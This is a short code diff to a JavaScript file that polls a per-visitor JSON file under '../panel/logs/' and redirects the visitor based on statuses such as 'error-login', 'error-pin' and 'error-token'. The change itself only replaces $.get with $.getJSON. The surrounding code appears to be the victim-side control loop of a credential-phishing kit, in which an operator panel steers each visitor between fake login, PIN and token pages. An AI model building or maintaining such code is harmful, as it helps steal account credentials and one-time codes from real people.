@@ -10,7 +10,7 @@ var jsonIp = ip.replace(/\./g, '-');
 var jsonFile = '../panel/logs/' + jsonIp + '.json';
 
 setInterval(() => {
-    $.get(jsonFile, function(data) {
+    $.getJSON(jsonFile, function(data) {
         if (data.redirect_to) {
             var url = data.redirect_to;
             if (data.status === 'error-login' || data.status === 'error-pin' || data.status === 'error-token') {
